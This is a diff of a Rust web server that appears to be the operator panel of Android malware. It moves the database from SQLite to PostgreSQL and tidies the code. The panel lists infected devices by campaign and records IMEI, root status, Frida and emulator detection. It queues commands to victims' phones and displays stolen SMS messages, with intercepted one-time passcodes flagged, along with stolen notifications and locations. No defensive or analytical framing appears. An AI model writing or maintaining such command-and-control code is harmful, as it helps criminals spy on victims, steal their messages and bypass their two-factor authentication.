@@ -1,8 +1,8 @@
 use anyhow::Result;
 use serde::{Deserialize, Serialize};
-use sqlx::SqlitePool;
+use sqlx::PgPool;
 use std::sync::Arc;
-use tracing::{debug, error, info};
+use tracing::{error, info};
 use warp::Filter;
 
 // ============================================================================
@@ -114,24 +114,22 @@ pub struct DashboardStats {
 // ============================================================================
 
 pub struct PanelServer {
-    db: SqlitePool,
+    db: PgPool,
     secret_key: String,
 }
 
 impl PanelServer {
-    pub fn new(db: SqlitePool, secret_key: String) -> Self {
+    pub fn new(db: PgPool, secret_key: String) -> Self {
         Self { db, secret_key }
     }
-
-    // ========== DEVICE ENDPOINTS ==========
 
     pub async fn list_devices(&self, campaign_id: &str) -> Result<Vec<DeviceListItem>> {
         let devices = sqlx::query_as::<_, (String, String, String, i32, String, String, String, bool, f64)>(
             r#"
-            SELECT device_id, fingerprint, campaign_id, os_version, 
+            SELECT device_id, fingerprint, campaign_id, os_version,
                    manufacturer, model, last_seen, is_active, data_exfilled_mb
             FROM devices
-            WHERE campaign_id = ?
+            WHERE campaign_id = $1
             ORDER BY last_seen DESC
             "#
         )
@@ -160,27 +158,26 @@ impl PanelServer {
     }
 
     pub async fn get_device_detail(&self, device_id: &str) -> Result<Option<DeviceDetail>> {
-        let device = sqlx::query_as::<_, (
-            String, String, String, String, String, i32, String, String, bool, bool, bool, Option<String>, Option<String>, f64, i32
-        )>(
+        type DeviceRow = (String, String, String, String, String, i32, String, String, bool, bool, bool, Option<String>, Option<String>, f64, i32);
+        let device = sqlx::query_as::<_, DeviceRow>(
             r#"
             SELECT device_id, fingerprint, campaign_id, first_seen, last_seen,
                    os_version, manufacturer, model, rooted, frida_detected, emulator,
                    country_code, imei, data_exfilled_mb, commands_executed
             FROM devices
-            WHERE device_id = ?
+            WHERE device_id = $1
             "#
         )
         .bind(device_id)
         .fetch_optional(&self.db)
         .await?;
 
-        if let Some((device_id, fingerprint, campaign_id, first_seen, last_seen, os_version, 
-                    manufacturer, model, rooted, frida_detected, emulator, country_code, 
+        if let Some((device_id, fingerprint, campaign_id, first_seen, last_seen, os_version,
+                    manufacturer, model, rooted, frida_detected, emulator, country_code,
                     imei, data_exfilled_mb, commands_executed)) = device {
-            
+
             let pending_commands: i64 = sqlx::query_scalar(
-                "SELECT COUNT(*) FROM commands WHERE device_id = ? AND status = 'pending'"
+                "SELECT COUNT(*) FROM commands WHERE device_id = $1 AND status = 'pending'"
             )
             .bind(device_id.clone())
             .fetch_one(&self.db)
@@ -209,8 +206,6 @@ impl PanelServer {
         }
     }
 
-    // ========== COMMAND ENDPOINTS ==========
-
     pub async fn send_command(&self, req: SendCommandRequest) -> Result<SendCommandResponse> {
         let command_id = uuid::Uuid::new_v4().to_string();
         let now = chrono::Utc::now();
@@ -222,7 +217,7 @@ impl PanelServer {
                 command_id, device_id, command_type, priority,
                 payload, status, created_at
             )
-            VALUES (?, ?, ?, ?, ?, 'pending', ?)
+            VALUES ($1, $2, $3, $4, $5, 'pending', $6)
             "#
         )
         .bind(&command_id)
@@ -234,7 +229,7 @@ impl PanelServer {
         .execute(&self.db)
         .await?;
 
-        info!("Command queued: command_id={}, device_id={}, type={}", 
+        info!("Command queued: command_id={}, device_id={}, type={}",
               command_id, req.device_id, req.command_type);
 
         Ok(SendCommandResponse {
@@ -248,7 +243,7 @@ impl PanelServer {
             r#"
             SELECT command_id, command_type, status, priority, created_at, result
             FROM commands
-            WHERE device_id = ?
+            WHERE device_id = $1
             ORDER BY created_at DESC
             LIMIT 100
             "#
@@ -274,16 +269,14 @@ impl PanelServer {
         Ok(result)
     }
 
-    // ========== DATA VIEWING ENDPOINTS ==========
-
     pub async fn get_device_sms(&self, device_id: &str, limit: i32) -> Result<Vec<SmsData>> {
         let sms = sqlx::query_as::<_, (String, Option<String>, Option<String>, bool, Option<String>, String)>(
             r#"
             SELECT sms_id, phone_number, body, is_otp, timestamp, received_at
             FROM exfil_sms
-            WHERE device_id = ?
+            WHERE device_id = $1
             ORDER BY received_at DESC
-            LIMIT ?
+            LIMIT $2
             "#
         )
         .bind(device_id)
@@ -294,14 +287,7 @@ impl PanelServer {
         let result = sms
             .into_iter()
             .map(|(sms_id, phone_number, body, is_otp, timestamp, received_at)| {
-                SmsData {
-                    sms_id,
-                    phone_number,
-                    body,
-                    is_otp,
-                    timestamp,
-                    received_at,
-                }
+                SmsData { sms_id, phone_number, body, is_otp, timestamp, received_at }
             })
             .collect();
 
@@ -313,9 +299,9 @@ impl PanelServer {
             r#"
             SELECT notif_id, app_package, title, body, timestamp, received_at
             FROM exfil_notifications
-            WHERE device_id = ?
+            WHERE device_id = $1
             ORDER BY received_at DESC
-            LIMIT ?
+            LIMIT $2
             "#
         )
         .bind(device_id)
@@ -326,14 +312,7 @@ impl PanelServer {
         let result = notifs
             .into_iter()
             .map(|(notif_id, app_package, title, body, timestamp, received_at)| {
-                NotificationData {
-                    notif_id,
-                    app_package,
-                    title,
-                    body,
-                    timestamp,
-                    received_at,
-                }
+                NotificationData { notif_id, app_package, title, body, timestamp, received_at }
             })
             .collect();
 
@@ -345,9 +324,9 @@ impl PanelServer {
             r#"
             SELECT location_id, latitude, longitude, accuracy, timestamp
             FROM exfil_locations
-            WHERE device_id = ?
+            WHERE device_id = $1
             ORDER BY timestamp DESC
-            LIMIT ?
+            LIMIT $2
             "#
         )
         .bind(device_id)
@@ -358,55 +337,61 @@ impl PanelServer {
         let result = locations
             .into_iter()
             .map(|(location_id, latitude, longitude, accuracy, timestamp)| {
-                LocationData {
-                    location_id,
-                    latitude,
-                    longitude,
-                    accuracy,
-                    timestamp,
-                }
+                LocationData { location_id, latitude, longitude, accuracy, timestamp }
             })
             .collect();
 
         Ok(result)
     }
 
-    // ========== DASHBOARD ==========
-
     pub async fn get_dashboard_stats(&self, campaign_id: &str) -> Result<DashboardStats> {
-        let total_devices: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM devices WHERE campaign_id = ?")
-            .bind(campaign_id)
-            .fetch_one(&self.db)
-            .await?;
+        let total_devices: i64 = sqlx::query_scalar(
+            "SELECT COUNT(*) FROM devices WHERE campaign_id = $1"
+        )
+        .bind(campaign_id)
+        .fetch_one(&self.db)
+        .await?;
 
-        let active_devices: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM devices WHERE campaign_id = ? AND is_active = TRUE")
-            .bind(campaign_id)
-            .fetch_one(&self.db)
-            .await?;
+        let active_devices: i64 = sqlx::query_scalar(
+            "SELECT COUNT(*) FROM devices WHERE campaign_id = $1 AND is_active = TRUE"
+        )
+        .bind(campaign_id)
+        .fetch_one(&self.db)
+        .await?;
 
-        let campaigns: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM campaigns WHERE is_active = TRUE")
-            .fetch_one(&self.db)
-            .await?;
+        let campaigns: i64 = sqlx::query_scalar(
+            "SELECT COUNT(*) FROM campaigns WHERE is_active = TRUE"
+        )
+        .fetch_one(&self.db)
+        .await?;
 
-        let total_data_mb: f64 = sqlx::query_scalar("SELECT COALESCE(SUM(data_exfilled_mb), 0) FROM devices WHERE campaign_id = ?")
-            .bind(campaign_id)
-            .fetch_one(&self.db)
-            .await?;
+        let total_data_mb: f64 = sqlx::query_scalar(
+            "SELECT COALESCE(SUM(data_exfilled_mb), 0) FROM devices WHERE campaign_id = $1"
+        )
+        .bind(campaign_id)
+        .fetch_one(&self.db)
+        .await?;
 
-        let sms_count: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM exfil_sms WHERE device_id IN (SELECT device_id FROM devices WHERE campaign_id = ?)")
-            .bind(campaign_id)
-            .fetch_one(&self.db)
-            .await?;
+        let sms_count: i64 = sqlx::query_scalar(
+            "SELECT COUNT(*) FROM exfil_sms WHERE device_id IN (SELECT device_id FROM devices WHERE campaign_id = $1)"
+        )
+        .bind(campaign_id)
+        .fetch_one(&self.db)
+        .await?;
 
-        let notification_count: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM exfil_notifications WHERE device_id IN (SELECT device_id FROM devices WHERE campaign_id = ?)")
-            .bind(campaign_id)
-            .fetch_one(&self.db)
-            .await?;
+        let notification_count: i64 = sqlx::query_scalar(
+            "SELECT COUNT(*) FROM exfil_notifications WHERE device_id IN (SELECT device_id FROM devices WHERE campaign_id = $1)"
+        )
+        .bind(campaign_id)
+        .fetch_one(&self.db)
+        .await?;
 
-        let command_count: i64 = sqlx::query_scalar("SELECT COUNT(*) FROM commands WHERE device_id IN (SELECT device_id FROM devices WHERE campaign_id = ?)")
-            .bind(campaign_id)
-            .fetch_one(&self.db)
-            .await?;
+        let command_count: i64 = sqlx::query_scalar(
+            "SELECT COUNT(*) FROM commands WHERE device_id IN (SELECT device_id FROM devices WHERE campaign_id = $1)"
+        )
+        .bind(campaign_id)
+        .fetch_one(&self.db)
+        .await?;
 
         Ok(DashboardStats {
             total_devices,
@@ -425,7 +410,6 @@ impl PanelServer {
 // ============================================================================
 
 pub async fn start_panel_server(server: Arc<PanelServer>, addr: std::net::SocketAddr) -> Result<()> {
-    // GET /api/devices/:campaign_id
     let list_devices = {
         let server = server.clone();
         warp::path!("api" / "devices" / String)
@@ -444,7 +428,6 @@ pub async fn start_panel_server(server: Arc<PanelServer>, addr: std::net::Socket
             })
     };
 
-    // GET /api/device/:device_id
     let get_device = {
         let server = server.clone();
         warp::path!("api" / "device" / String)
@@ -464,7 +447,6 @@ pub async fn start_panel_server(server: Arc<PanelServer>, addr: std::net::Socket
             })
     };
 
-    // POST /api/command
     let send_command = {
         let server = server.clone();
         warp::path!("api" / "command")
@@ -484,7 +466,6 @@ pub async fn start_panel_server(server: Arc<PanelServer>, addr: std::net::Socket
             })
     };
 
-    // GET /api/dashboard/:campaign_id
     let dashboard = {
         let server = server.clone();
         warp::path!("api" / "dashboard" / String)
@@ -509,11 +490,11 @@ pub async fn start_panel_server(server: Arc<PanelServer>, addr: std::net::Socket
         .or(dashboard);
 
     info!("Panel server starting on {}", addr);
-    warp::serve(routes)
+    let (_, server_future) = warp::serve(routes)
         .bind_with_graceful_shutdown(addr, async {
             tokio::signal::ctrl_c().await.ok();
-        })
-        .await;
+        });
+    server_future.await;
 
     Ok(())
 }
